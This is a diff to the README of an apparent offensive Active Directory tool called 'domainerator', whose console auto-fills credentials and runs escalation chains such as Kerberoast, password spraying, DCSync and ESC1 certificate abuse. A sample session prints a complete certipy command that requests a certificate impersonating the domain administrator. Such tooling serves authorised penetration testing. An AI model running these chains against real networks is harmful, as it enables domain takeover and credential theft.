@@ -144,7 +144,7 @@ The console maps these to settable variables. Target-derived values (`DC`, `DC_I
 `DOMAIN`, `USER`, `PASS`) are auto-populated from your scan arguments; the rest you set as
 needed. `options` lists them all:
 
-| Variable | Fills placeholders | Auto-filled from |
+| Variable | Fills placeholders | Auto-filled / default |
 | --- | --- | --- |
 | `LHOST` | `ATTACKER-IP`, `ATTACKER-HOST`, `attacker@port` | — (set manually) |
 | `USERLIST` | `users.txt` | — |
@@ -154,12 +154,24 @@ needed. `options` lists them all:
 | `DOMAIN` | `DOMAIN` | `--domain` |
 | `USER` | `USER` | `--username` |
 | `PASS` | `PASS` | `--password` |
-| `CA` | `CORP-CA`, `CA-NAME`, `CA_NAME` | — |
-| `TEMPLATE` | `TEMPLATE-NAME`, `TEMPLATE_NAME` | — |
+| `CA` | `CORP-CA`, `CA-NAME`, `CA_NAME` | — (set per environment) |
+| `TEMPLATE` | `TEMPLATE-NAME`, `TEMPLATE_NAME`, `VULN-TEMPLATE` | — (set per environment) |
+| `TARGET` | `TARGET$`, `TARGET` | — (set per environment) |
+| `WORDLIST` | `wordlist.txt` | `/usr/share/wordlists/rockyou.txt` |
 | `SPRAY_PASSWORD` | `Season2025!` | — |
 
-A command is only runnable once its recognised placeholders are filled — the console
-refuses to execute a step with unfilled variables and tells you which are missing.
+The credential-derived variables (`DC`, `DC_IP`, `DOMAIN`, `USER`, `PASS`) are filled
+automatically from the arguments you authenticated with, so credential-only steps —
+Kerberoast and its crack, AS-REP/timeroast cracking, PKINIT authentication, DCSync — resolve
+to runnable commands with no manual setup. `WORDLIST` carries a working default. The only
+values you must supply are environment-specific: `CA`/`TEMPLATE` for an AD CS request and
+`TARGET` for an RBCD/shadow-credential step.
+
+A command is only runnable once **every** recognised placeholder resolves. Before executing,
+the console re-scans the fully-substituted command for any leftover placeholder literal
+(e.g. `VULN-TEMPLATE`, `TARGET$`) and **refuses to run** if one remains — naming the exact
+variable to `set` — so a step never executes with broken literals that look like they ran
+but can't actually escalate.
 
 ### Execution and the reactive loop
 
@@ -295,19 +307,24 @@ domainerator > show paths
 
 ID   Goal                 Steps  Reliability   Noise
 ------------------------------------------------------------
- 0   domain_admin         4      High          Moderate
+ 1   domain_admin         4      High          Moderate
      ESC1 -> PKINIT-auth -> DCSync -> Domain Admin
- 1   domain_admin         6      Moderate      Loud
+ 2   domain_admin         6      Moderate      Loud
      RID-cycling -> Password-spray -> Kerberoast -> Hash-crack -> ...
 
 Total: 2 paths
+Select one with 'use <id>' (e.g. 'use 1').
 
-domainerator > set CA CORP-CA
-CA => CORP-CA
+domainerator > set CA corp-CA
+CA => corp-CA
+domainerator > set TEMPLATE VulnTemplate
+TEMPLATE => VulnTemplate
 
-domainerator > use 0
-Selected path 0: ESC1 -> PKINIT-auth -> DCSync => domain_admin
+domainerator > use 1
+Selected path 1: ESC1 -> PKINIT-auth -> DCSync => domain_admin
+Goal: domain_admin
 Steps: 4
+Reachability: all 4 step(s) are satisfiable from your current capabilities -> goal is achievable.
 
 Step 1/4: ESC1 - Exploitable certificate template
 Technique: ESC1
@@ -315,7 +332,7 @@ Reliability: High
 Noise: Moderate
 
 Command:
-  certipy req -u alice -p S3cret! -dc-ip 10.0.0.10 -ca CORP-CA -template ...
+  certipy req -u alice@corp.local -p S3cret! -ca corp-CA -template VulnTemplate -upn administrator@corp.local -dc-ip 10.0.0.10
 
 domainerator (path) > run
 ...
